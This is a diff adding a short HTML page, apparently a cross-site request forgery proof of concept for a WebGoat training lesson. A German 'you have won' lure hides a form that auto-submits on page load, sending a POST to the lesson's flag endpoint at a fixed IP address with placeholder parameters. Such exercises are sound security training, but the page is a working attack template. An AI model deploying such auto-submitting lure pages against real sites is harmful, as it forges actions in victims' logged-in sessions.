@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>Herzlichen Glückwunsch! Sie haben gewonnen!</h1>
+    <form
+      id="csrfForm"
+      action="http://98.80.122.8:8080/WebGoat/csrf/basic-get-flag"
+      method="POST"
+    >
+      <input type="hidden" name="<parameter1>" value="<wert1>" />
+    </form>
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
